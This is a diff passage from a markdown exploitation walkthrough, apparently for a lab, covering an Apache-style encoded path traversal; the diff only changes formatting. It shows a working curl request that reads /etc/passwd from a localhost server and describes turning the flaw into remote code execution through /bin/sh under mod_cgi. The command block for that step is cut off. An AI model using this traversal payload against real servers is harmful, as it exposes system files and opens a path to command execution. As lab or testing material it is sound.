@@ -16,15 +16,17 @@ When validating whether a requested URI path traverses outside the document root
 ## Exploitation Walkthrough
 
 ### 1. Arbitrary File Read via Path Traversal
+
 Send a request using `.%2e/` path sequences to traverse outside DocumentRoot and read `/etc/passwd`:
 
 ```bash
 curl -s --path-as-is 'http://localhost:8138/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
 ```
 
-*Note: The `--path-as-is` flag in curl is essential to prevent the local curl client from normalizing `.%2e/` before transmitting the raw request to the server.*
+_Note: The `--path-as-is` flag in curl is essential to prevent the local curl client from normalizing `.%2e/` before transmitting the raw request to the server._
 
 ### 2. Remote Code Execution via mod_cgi
+
 Because `mod_cgi` is active on `/cgi-bin/`, you can traverse to `/bin/sh` and pass arbitrary commands via HTTP POST body:
 
 ```bash
